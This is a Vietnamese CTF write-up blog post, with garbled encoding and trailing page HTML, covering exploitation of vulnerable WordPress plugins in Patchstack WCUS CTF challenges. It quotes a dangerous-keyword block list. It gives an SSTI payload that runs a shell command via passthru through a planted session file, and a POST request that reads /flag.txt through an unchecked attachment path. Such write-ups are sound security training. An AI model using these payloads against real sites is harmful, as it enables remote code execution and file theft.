Sau khi xÃ¡c Ä‘á»‹nh ráº±ng tÃªn file há»£p lá»‡, ná»™i dung cá»§a file sáº½ Ä‘Æ°á»£c Ä‘á»c vÃ  kiá»ƒm tra qua hai hÃ m is_timber_template() vÃ  is_valid_template() Ä‘á»ƒ Ä‘áº£m báº£o ráº±ng file khÃ´ng chá»©a cÃ¡c Ä‘oáº¡n mÃ£ nguy hiá»ƒm.\n    HÃ m is_timber_template():\n1 2 3 4 5 6 7 8  function is_timber_template($content) { $pattern = '/({{.*?}}|{%.*?%}|{#.*?#})/'; if (preg_match($pattern, $content)) { return true; } else { return false; } }   HÃ m nÃ y kiá»ƒm tra xem file cÃ³ chá»©a cÃ¡c biá»ƒu thá»©c liÃªn quan Ä‘áº¿n Timber template engine (nhÆ° {{ }}, {% %}, hoáº·c {# #}). Náº¿u file cÃ³ chá»©a cÃ¡c Ä‘oáº¡n mÃ£ nÃ y, nÃ³ Ä‘Æ°á»£c coi lÃ  má»™t template há»£p lá»‡ Ä‘á»ƒ Timber cÃ³ thá»ƒ render.\n  HÃ m is_valid_template():\n1 2 3 4 5 6 7 8  function is_valid_template($content) { $pattern = '/\\b(filter|system|cat|bash|bin|exec|_self|env|dump|app|sort|tac|file_excerpt|\\/bin|FILENAME)\\b/i'; if (preg_match($pattern, $content)) { return false; } else { return true; } }   HÃ m nÃ y kiá»ƒm tra xem ná»™i dung file cÃ³ chá»©a cÃ¡c tá»« khÃ³a nguy hiá»ƒm nhÆ° system, exec, cat, bash, env, v.v. ÄÃ¢y lÃ  cÃ¡c tá»« khÃ³a cÃ³ thá»ƒ liÃªn quan Ä‘áº¿n viá»‡c thá»±c thi lá»‡nh há»‡ thá»‘ng hoáº·c thao tÃ¡c vá»›i file, vÃ¬ váº­y náº¿u chÃºng xuáº¥t hiá»‡n, file sáº½ bá»‹ tá»« chá»‘i Ä‘á»ƒ trÃ¡nh cÃ¡c cuá»™c táº¥n cÃ´ng RCE (Remote Code Execution).\n  CÃ¡ch khai thÃ¡c tiá»m nÄƒng: Tuy Ä‘oáº¡n mÃ£ Ä‘Ã£ cÃ³ cÃ¡c cÆ¡ cháº¿ kiá»ƒm tra Ä‘á»ƒ ngÄƒn cháº·n viá»‡c sá»­ dá»¥ng cÃ¡c file nguy hiá»ƒm hoáº·c ná»™i dung Ä‘á»™c háº¡i, nhÆ°ng cÃ³ thá»ƒ táº­n dá»¥ng náº¿u biáº¿t trÆ°á»›c cÃ¡c tÃªn file há»£p lá»‡ trÃªn server. Cá»¥ thá»ƒ:\n  SSTI (Server-Side Template Injection): Do tham sá»‘ page Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ render file template báº±ng Timber, náº¿u cÃ³ thá»ƒ Ä‘oÃ¡n Ä‘Æ°á»£c tÃªn file template há»£p lá»‡, cÃ³ thá»ƒ khai thÃ¡c SSTI. Tuy nhiÃªn, do cÃ³ cÃ¡c biá»‡n phÃ¡p kiá»ƒm tra ná»™i dung template qua hÃ m is_timber_template() vÃ  is_valid_template(), viá»‡c trá»±c tiáº¿p thá»±c hiá»‡n RCE báº±ng SSTI qua cÃ¡c tá»« khÃ³a nguy hiá»ƒm nhÆ° system hay exec lÃ  khÃ³ thá»±c hiá»‡n.\n  Bypass validate(): Äá»ƒ vÆ°á»£t qua hÃ m validate(), báº¡n cáº§n cung cáº¥p giÃ¡ trá»‹ page vá»›i má»™t tÃªn file chÃ­nh xÃ¡c, khÃ´ng chá»©a pháº§n má»Ÿ rá»™ng bá»‹ cáº¥m, vÃ  khÃ´ng chá»©a cÃ¡c tá»« khÃ³a bá»‹ cáº¥m trong ná»™i dung.\n  PhÃ¢n tÃ­ch tiáº¿p theo Trong Ä‘oáº¡n code mÃ  bÃ i viáº¿t Ä‘á» cáº­p, cÃ³ má»™t chá»©c nÄƒng lÆ°u trá»¯ dá»¯ liá»‡u vÃ o session thÃ´ng qua hÃ m save_session(). Äiá»ƒm Ä‘Ã¡ng chÃº Ã½ lÃ  dá»¯ liá»‡u tá»« request cÃ³ thá»ƒ Ä‘Æ°á»£c lÆ°u vÃ o file session trÃªn server thÃ´ng qua hÃ m session_start(), vÃ  file nÃ y sáº½ náº±m trong thÆ° má»¥c /tmp, Ä‘iá»u nÃ y cÃ³ thá»ƒ dáº«n Ä‘áº¿n má»™t kháº£ nÄƒng khai thÃ¡c thÃº vá»‹.\nPhÃ¢n tÃ­ch chi tiáº¿t Ä‘oáº¡n code save_session(): 1 2 3 4 5 6 7 8 9 10 11  function save_session() { start_session(); if (isset($_REQUEST['session_data'])) { $_SESSION['session_data'] = stripslashes($_REQUEST['session_data']); wp_send_json_success('Data is saved to session.'); } else { wp_send_json_error('Some error happened.'); } } add_action('wp_ajax_save_session', 'save_session'); add_action('wp_ajax_nopriv_save_session', 'save_session');     HÃ m save_session():\n HÃ m nÃ y sáº½ báº¯t Ä‘áº§u má»™t session vá»›i start_session(). Náº¿u cÃ³ tham sá»‘ session_data Ä‘Æ°á»£c gá»­i thÃ´ng qua request, nÃ³ sáº½ lÆ°u dá»¯ liá»‡u Ä‘Ã³ vÃ o biáº¿n $_SESSION['session_data'] vÃ  pháº£n há»“i láº¡i client thÃ´ng qua JSON ráº±ng dá»¯ liá»‡u Ä‘Ã£ Ä‘Æ°á»£c lÆ°u thÃ nh cÃ´ng. Náº¿u khÃ´ng cÃ³ tham sá»‘ nÃ y, nÃ³ sáº½ tráº£ vá» lá»—i.    Session file:\n Khi hÃ m start_session() Ä‘Æ°á»£c gá»i, má»™t file session sáº½ Ä‘Æ°á»£c táº¡o ra trong thÆ° má»¥c /tmp vá»›i tÃªn dáº¡ng sess_xxx, trong Ä‘Ã³ xxx lÃ  session ID. Dá»¯ liá»‡u Ä‘Æ°á»£c lÆ°u trá»¯ trong session sáº½ Ä‘Æ°á»£c ghi vÃ o file nÃ y. Äiá»u nÃ y bao gá»“m cáº£ ná»™i dung cá»§a $_SESSION['session_data'], tá»©c lÃ  giÃ¡ trá»‹ cá»§a $_REQUEST['session_data'] sáº½ Ä‘Æ°á»£c ghi vÃ o file session trong thÆ° má»¥c /tmp.    Khai thÃ¡c kháº£ nÄƒng lÆ°u SSTI vÃ o session file: Dá»±a trÃªn cÆ¡ cháº¿ xá»­ lÃ½ nÃ y, chÃºng ta cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ lÆ°u má»™t payload khai thÃ¡c SSTI vÃ o file session trong thÆ° má»¥c /tmp. NhÆ° Ä‘Ã£ phÃ¢n tÃ­ch á»Ÿ pháº§n trÆ°á»›c, hÃ m validate() trong bÃ i kiá»ƒm tra cÃ¡c Ä‘iá»u kiá»‡n Ä‘á»ƒ quyáº¿t Ä‘á»‹nh xem file nÃ o cÃ³ thá»ƒ Ä‘Æ°á»£c render bá»Ÿi Timber. Äiá»u quan trá»ng lÃ  hÃ m nÃ y cho phÃ©p truy cáº­p vÃ o cÃ¡c file náº±m trong thÆ° má»¥c /tmp, vÃ¬ Timber Ä‘Ã£ Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘á»ƒ tÃ¬m kiáº¿m template á»Ÿ cáº£ thÆ° má»¥c /tmp vÃ  templates thÃ´ng qua Ä‘oáº¡n code:\n1  Timber::$dirname = array('../../../../../../../../../../../../tmp', 'templates');   Äiá»u nÃ y cÃ³ nghÄ©a lÃ , náº¿u chÃºng ta lÆ°u má»™t payload SSTI há»£p lá»‡ vÃ o file session, chÃºng ta cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ Timber render file Ä‘Ã³ nhÆ° má»™t template vÃ  kÃ­ch hoáº¡t lá»— há»•ng SSTI.\nCÃ¡ch khai thÃ¡c:   LÆ°u payload SSTI vÃ o session file:\nChÃºng ta cÃ³ thá»ƒ gá»­i má»™t request tá»›i action save_session vá»›i tham sá»‘ session_data chá»©a payload SSTI.\nPayload SSTI:\n1  {{['grep . /flag.txt']|map('passthru')}}}    Do á»Ÿ Ä‘Ã¢y hÃ m filter cÃ³ cháº·n nhá»¯ng tá»« khoÃ¡ nhÆ° system, cat, .v.v.. nÃªn sá»­ dá»¥ng payload trÃªn thÃ¬ ğŸ‘Œ\n Gá»­i request Ä‘á»ƒ lÆ°u payload nÃ y vÃ o session:\n1 2 3 4  POST /wp-admin/admin-ajax.php?action=save_session Content-Type: application/x-www-form-urlencoded session_data={{['grep . /flag.txt']|map('passthru')}}}     XÃ¡c Ä‘á»‹nh tÃªn file session:\nFile session sáº½ cÃ³ tÃªn dáº¡ng sess_. Session ID nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c láº¥y tá»« cookie cá»§a trÃ¬nh duyá»‡t sau khi gá»­i request Ä‘áº§u tiÃªn hoáº·c báº±ng cÃ¡ch tÃ¬m session ID trá»±c tiáº¿p trÃªn server (náº¿u cÃ³ quyá»n truy cáº­p).\n  Render file session:\n Sau khi lÆ°u payload vÃ o session file, chÃºng ta cÃ³ thá»ƒ thá»±c hiá»‡n cuá»™c táº¥n cÃ´ng SSTI báº±ng cÃ¡ch gá»­i request Ä‘áº¿n endpoint vá»›i tham sá»‘ page trá» Ä‘áº¿n file session vá»«a táº¡o. TÃªn file session sáº½ lÃ  sess_.  1  GET /wp-admin/admin-ajax.php?page=sess_   VÃ  Ä‘á»c Ä‘Æ°á»£c flag\n  Texting Trouble Vá»›i challeng nÃ y, chÃºng ta cÃ¹ng phÃ¢n tÃ­ch hÃ m send_message_callback()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107  public function send_message_callback() { $error = 0; $formdata = $_POST['formdata']; parse_str($formdata, $output); $message = sanitize_textarea_field($output['jotac-plugin-messages']['jot-message']); $mess_type = sanitize_text_field($output['jotac-plugin-messages']['jot-message-type']); $mess_suffix = sanitize_text_field($output['jotac-plugin-messages']['jot-message-suffix']); $mess_attachment = sanitize_text_field($output['jotac-plugin-messages']['jot-attachment']); $jotmemkey = sanitize_text_field($_POST['jotmemid']); $jotseckey = sanitize_text_field($_POST['sec']); if (!empty($jotmemkey)) { list($jotgrpid,$jotmemid) = explode(\"-\", $jotmemkey, 2); $member = $this-get_member($jotmemid); } if (empty($jotseckey) || JOTAC_Plugin()-key!==$jotseckey) { // Bail out  die(); } if (empty($message)) { // Empty message  $error = 3; } if ($error == 0) { if (JOTAC_Plugin()-currentsmsprovider) { // Save message type  $smsmessage = get_option('jotac-plugin-messages'); $smsmessage['jot-message-type'] = $mess_type; // Save message suffix  $smsmessage['jot-message-suffix'] = $mess_suffix; // Save message content  $smsmessage['jot-message'] = $message; update_option('jotac-plugin-messages',$smsmessage); // Replace tags in message  $message = $this-get_replace_tags($message,$member); // Append Message suffix  if (!empty($mess_suffix)) { $fullmessage = $message . \" \" . $mess_suffix ; } else { $fullmessage = $message; } // Optional attachment  if (!empty($mess_attachment)) { if (preg_match('/^[a-zA-Z]+:\\/\\//', $mess_attachment)) { $error = 6; $additional_error = \"Incorrect format\"; } $allowed_extensions = ['txt','png','jpg','pdf']; if (!in_array(pathinfo($mess_attachment, PATHINFO_EXTENSION), $allowed_extensions)) { $error = 6; $additional_error = \"Filetype not supported\"; } else { $wp_dir = wp_upload_dir(); $attachment_fp = $wp_dir['basedir'] . '/attachments/' . $mess_attachment; $available_files = array_diff(scandir(dirname($attachment_fp)), array('.', '..')); $existing_files = []; foreach ($available_files as $f) { $existing_files[] = $f; } if (in_array(basename($attachment_fp), $existing_files)) { $attachment_raw = file_get_contents($attachment_fp); } else { $error = 6; $additional_error = \"File does not exist among [\".implode(', ', $existing_files).\"]\"; } } } $fullmessage = apply_filters('jot-send-message-messagetext',$fullmessage); if (!empty($member)) { $message_type = sanitize_text_field($output['jotac-plugin-messages']['jot-message-type']); switch ( $message_type ) { case 'jot-sms'; $message_error = JOTAC_Plugin()-currentsmsprovider-send_smsmessage($member['jot_grpmemnum'],$fullmessage,$attachment_raw); break; case 'jot-call'; $message_error = JOTAC_Plugin()-currentsmsprovider-send_callmessage($member['jot_grpmemnum'],$fullmessage); break; } } if ($message_error['send_message_errorcode'] != 0) { //An error occurred sending the message  $error = 999; } $all_send_errors[] = $message_error; } else { $error = 1; } }   Táº¡i Ä‘Ã¢y cÃ³ thá»ƒ tháº¥y Ä‘Æ°á»£c Ä‘oáº¡n code\n1  $attachment_raw = file_get_contents($attachment_fp);   cÃ³ thá»ƒ táº¥n cÃ´ng Ä‘Æ°á»£c thÃ´ng qua file_get_contents() Ä‘á»ƒ Ä‘á»c flag. HÃ m nÃ y Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ Ä‘á»c ná»™i dung file Ä‘Ã­nh kÃ¨m tá»« Ä‘Æ°á»ng dáº«n $attachment_fp. Náº¿u chÃºng ta cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘áº§u vÃ o cá»§a biáº¿n $mess_attachment, viá»‡c chá»‰ Ä‘á»‹nh má»™t file cá»¥ thá»ƒ, nhÆ° /flag.txt, sáº½ cho phÃ©p há»‡ thá»‘ng Ä‘á»c ná»™i dung cá»§a file Ä‘Ã³ thÃ´ng qua file_get_contents().\nPhÃ¢n tÃ­ch lá»— há»•ng trong hÃ m send_message_callback() vÃ  khai thÃ¡c qua file_get_contents() Dá»¯ liá»‡u tá»« $_POST['formdata'] Ä‘Æ°á»£c xá»­ lÃ½ báº±ng cÃ¡c hÃ m nhÆ° sanitize_textarea_field() vÃ  sanitize_text_field(), bao gá»“m giÃ¡ trá»‹ mess_attachment. Há»‡ thá»‘ng kiá»ƒm tra xem file Ä‘Ã­nh kÃ¨m cÃ³ tá»“n táº¡i trong thÆ° má»¥c /attachments/ vÃ  cÃ³ Ä‘á»‹nh dáº¡ng há»£p lá»‡ hay khÃ´ng. Tuy nhiÃªn, náº¿u chá»‰ Ä‘á»‹nh má»™t Ä‘Æ°á»ng dáº«n trá»±c tiáº¿p Ä‘áº¿n file nháº¡y cáº£m nhÆ° /flag.txt, hÃ m file_get_contents() váº«n cÃ³ thá»ƒ Ä‘á»c Ä‘Æ°á»£c ná»™i dung cá»§a file nÃ y náº¿u nÃ³ tá»“n táº¡i trÃªn há»‡ thá»‘ng.\nSau khi ná»™i dung file Ä‘Æ°á»£c Ä‘á»c, náº¿u xáº£y ra lá»—i trong quÃ¡ trÃ¬nh gá»­i tin nháº¯n, cháº³ng háº¡n do nhÃ  cung cáº¥p dá»‹ch vá»¥ SMS, há»‡ thá»‘ng sáº½ tráº£ vá» thÃ´ng bÃ¡o lá»—i chá»©a thÃ´ng tin vá» file vá»«a Ä‘á»c. Lá»— há»•ng nÃ y táº¡o ra cÆ¡ há»™i Ä‘á»ƒ trÃ­ch xuáº¥t thÃ´ng tin nháº¡y cáº£m tá»« file mÃ  khÃ´ng cáº§n pháº£i vÆ°á»£t qua cÃ¡c rÃ o cáº£n báº£o máº­t khÃ¡c.\nChÃºng ta cÃ³ thá»ƒ khai thÃ¡c báº±ng cÃ¡ch gá»­i má»™t yÃªu cáº§u POST tá»›i há»‡ thá»‘ng vá»›i giÃ¡ trá»‹ mess_attachment trá» trá»±c tiáº¿p Ä‘áº¿n file /flag.txt. Náº¿u cÃ³ lá»—i phÃ¡t sinh trong quÃ¡ trÃ¬nh gá»­i tin nháº¯n (nhÆ° trong trÆ°á»ng há»£p nhÃ  cung cáº¥p dá»‹ch vá»¥ SMS khÃ´ng kháº£ dá»¥ng), ná»™i dung cá»§a file flag sáº½ Ä‘Æ°á»£c tráº£ vá» dÆ°á»›i dáº¡ng má»™t pháº§n cá»§a thÃ´ng bÃ¡o lá»—i. Báº±ng cÃ¡ch nÃ y, chÃºng ta cÃ³ thá»ƒ dá»… dÃ ng Ä‘á»c Ä‘Æ°á»£c flag mÃ  khÃ´ng cáº§n pháº£i vÆ°á»£t qua cÃ¡c kiá»ƒm tra file loáº¡i bá» thÃ´ng thÆ°á»ng.\nKhai thÃ¡c:   Gá»­i yÃªu cáº§u vá»›i mess_attachment trá» Ä‘áº¿n file flag /flag.txt:\n1 2 3 4  POST /wp-admin/admin-ajax.php?action=send_message Content-Type: application/x-www-form-urlencoded formdata=jotac-plugin-messages[jot-message]=test_message\u0026jotac-plugin-messages[jot-message-type]=jot-sms\u0026jotac-plugin-messages[jot-attachment]=/flag.txt\u0026sec=6AGmIzDZktwJCaQt   Vá»›i giÃ¡ trá»‹ sec Ä‘Æ°á»£c láº¥y tá»«\n1 2 3 4 5 6 7  public function __construct () { $this-product = \"JOTAC SMS\";\t$this-token = 'jotac-plugin'; $this-key = '6AGmIzDZktwJCaQt'; $this-version = '4.0.0'; $this-debug = false;\t    Khi xáº£y ra lá»—i trong quÃ¡ trÃ¬nh gá»­i tin nháº¯n (trong case 'jot-sms'), ná»™i dung cá»§a file flag Ä‘Æ°á»£c lÆ°u trong $attachment_raw sáº½ xuáº¥t hiá»‡n trong pháº£n há»“i lá»—i tráº£ vá» tá»« server.\n  Pháº§n tiáº¿p theo báº¡n Ä‘á»c Ä‘á»c táº¡i Ä‘Ã¢y https://viblo.asia/p/writeup-patchstack-wcus-ctf-obA46w1BJKv\n","wordCount":"3929","inLanguage":"en","datePublished":"2024-09-21T16:28:54+07:00","dateModified":"2024-09-21T16:28:54+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/writeup-patchstack-wcus-ctf/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;Â»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class=post-title>Writeup Patchstack WCUS CTF</h1><div class=post-meta><span title="2024-09-21 16:28:54 +0700 +0700">September 21, 2024</span>&nbsp;Â·&nbsp;19 min&nbsp;Â·&nbsp;minhtuanact</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#wp-elevator aria-label="WP Elevator">WP Elevator</a></li><li><a href=#link-manager aria-label="Link Manager">Link Manager</a><ul><ul><li><a href=#khai-th%c3%a1c-sql-injection aria-label="Khai thÃ¡c SQL Injection">Khai thÃ¡c SQL Injection</a></li></ul></ul></li><li><a href=#justinwonkytokens aria-label=JustinWonkyTokens>JustinWonkyTokens</a></li><li><a href=#timberlake aria-label=Timberlake>Timberlake</a><ul><ul><li><a href=#gi%e1%ba%a3i-th%c3%adch-chi-ti%e1%ba%bft-c%c3%a1c-ph%e1%ba%a7n-quan-tr%e1%bb%8dng aria-label="Giáº£i thÃ­ch chi tiáº¿t cÃ¡c pháº§n quan trá»ng:">Giáº£i thÃ­ch chi tiáº¿t cÃ¡c pháº§n quan trá»ng:</a></li><li><a href=#c%c3%a1ch-khai-th%c3%a1c-ti%e1%bb%81m-n%c4%83ng aria-label="CÃ¡ch khai thÃ¡c tiá»m nÄƒng:">CÃ¡ch khai thÃ¡c tiá»m nÄƒng:</a></li><li><a href=#ph%c3%a2n-t%c3%adch-ti%e1%ba%bfp-theo aria-label="PhÃ¢n tÃ­ch tiáº¿p theo">PhÃ¢n tÃ­ch tiáº¿p theo</a></li><li><a href=#ph%c3%a2n-t%c3%adch-chi-ti%e1%ba%bft-%c4%91o%e1%ba%a1n-code-save_session aria-label="PhÃ¢n tÃ­ch chi tiáº¿t Ä‘oáº¡n code save_session():">PhÃ¢n tÃ­ch chi tiáº¿t Ä‘oáº¡n code <code>save_session()</code>:</a></li><li><a href=#khai-th%c3%a1c-kh%e1%ba%a3-n%c4%83ng-l%c6%b0u-ssti-v%c3%a0o-session-file aria-label="Khai thÃ¡c kháº£ nÄƒng lÆ°u SSTI vÃ o session file:">Khai thÃ¡c kháº£ nÄƒng lÆ°u SSTI vÃ o session file:</a></li><li><a href=#c%c3%a1ch-khai-th%c3%a1c aria-label="CÃ¡ch khai thÃ¡c:">CÃ¡ch khai thÃ¡c:</a></li></ul></ul></li><li><a href=#texting-trouble aria-label="Texting Trouble">Texting Trouble</a><ul><ul><li><a href=#ph%c3%a2n-t%c3%adch-l%e1%bb%97-h%e1%bb%95ng-trong-h%c3%a0m-send_message_callback-v%c3%a0-khai-th%c3%a1c-qua-file_get_contents aria-label="PhÃ¢n tÃ­ch lá»— há»•ng trong hÃ m send_message_callback() vÃ  khai thÃ¡c qua file_get_contents()">PhÃ¢n tÃ­ch lá»— há»•ng trong hÃ m <code>send_message_callback()</code> vÃ  khai thÃ¡c qua <code>file_get_contents()</code></a></li><li><a href=#khai-th%c3%a1c aria-label="Khai thÃ¡c:">Khai thÃ¡c:</a></li></ul></ul></li></ul></div></details></div><div class=post-content><p>Trong thá»i gian gáº§n Ä‘Ã¢y, Patchstack Ä‘Ã£ tá»• chá»©c cuá»™c thi Patchstack WCUS CTF, bao gá»“m 9 thá»­ thÃ¡ch (challenge), táº¥t cáº£ Ä‘á»u táº­p trung vÃ o viá»‡c khai thÃ¡c cÃ¡c lá»— há»•ng báº£o máº­t trong cÃ¡c plugin WordPress. Sau Ä‘Ã¢y lÃ  má»™t sá»‘ writeup vá» cÃ¡c thá»­ thÃ¡ch Ä‘Ã³.</p><p>Táº¥t cáº£ cÃ¡c challenge Ä‘á»u Ä‘Æ°á»£c cung cáº¥p dÆ°á»›i dáº¡ng whitebox.</p><h1 id=wp-elevator>WP Elevator<a hidden class=anchor aria-hidden=true href=#wp-elevator>#</a></h1><p><img loading=lazy src=https://images.viblo.asia/0e94303d-3548-47a0-ace3-7738f3969f89.png alt=image.png></p><p>Trong challenge nÃ y, Ä‘á» bÃ i cung cáº¥p cho chÃºng ta má»™t plugin WordPress. Nhiá»‡m vá»¥ cá»§a chÃºng ta lÃ  gá»i Ä‘Ãºng endpoint Ä‘á»ƒ láº¥y Ä‘Æ°á»£c flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span><span class=s2>&#34;wp_ajax_patchstack_flagger&#34;</span><span class=p>,</span> <span class=s2>&#34;flagger_request_callback&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>flagger_request_callback</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Validate nonce
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$nonce</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;nonce&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=o>?</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;nonce&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>wp_verify_nonce</span><span class=p>(</span><span class=nv>$nonce</span><span class=p>,</span> <span class=s2>&#34;get_latest_posts_nonce&#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s2>&#34;Invalid nonce.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$user</span> <span class=o>=</span> <span class=nx>wp_get_current_user</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nv>$allowed_roles</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;administrator&#34;</span><span class=p>,</span> <span class=s2>&#34;subscriber&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>array_intersect</span><span class=p>(</span><span class=nv>$allowed_roles</span><span class=p>,</span> <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>roles</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$value</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_success</span><span class=p>([</span><span class=s2>&#34;value&#34;</span> <span class=o>=&gt;</span> <span class=nv>$value</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s2>&#34;Missing permission.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Váº­y, chá»‰ cáº§n chÃºng ta cÃ³ Ä‘Æ°á»£c role <code>administrator</code> hoáº·c <code>subscriber</code>, chÃºng ta sáº½ nháº­n Ä‘Æ°á»£c flag.</p><p>NhÆ°ng lÃ m tháº¿ nÃ o Ä‘á»ƒ cÃ³ thá»ƒ Ä‘Äƒng kÃ½ má»™t tÃ i khoáº£n <code>subscriber</code>? Trong mÃ£ nguá»“n, cÃ³ má»™t Ä‘oáº¡n code cho phÃ©p táº¡o ngÆ°á»i dÃ¹ng má»›i vá»›i role <code>subscriber</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>create_user_via_api</span><span class=p>(</span><span class=nv>$request</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$parameters</span> <span class=o>=</span> <span class=nv>$request</span><span class=o>-&gt;</span><span class=na>get_json_params</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
